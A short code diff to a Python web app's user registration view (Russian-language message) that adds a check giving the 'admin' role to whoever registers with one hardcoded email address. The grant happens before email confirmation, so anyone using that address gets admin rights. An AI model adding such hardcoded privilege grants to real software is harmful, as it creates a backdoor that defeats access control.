@@ -68,6 +68,8 @@ def register() -> Response | str:
                             datetime.utcnow(),
                             form.middle_name.data
                             )
+        if user.email == 'anton.strokov@me.com':
+            user.role = 'admin'
         user.save()
         user.send_confirmation_email()
         flash(f'Поздравляем, {user.username}, Вы зарегистрированы!', 'success')
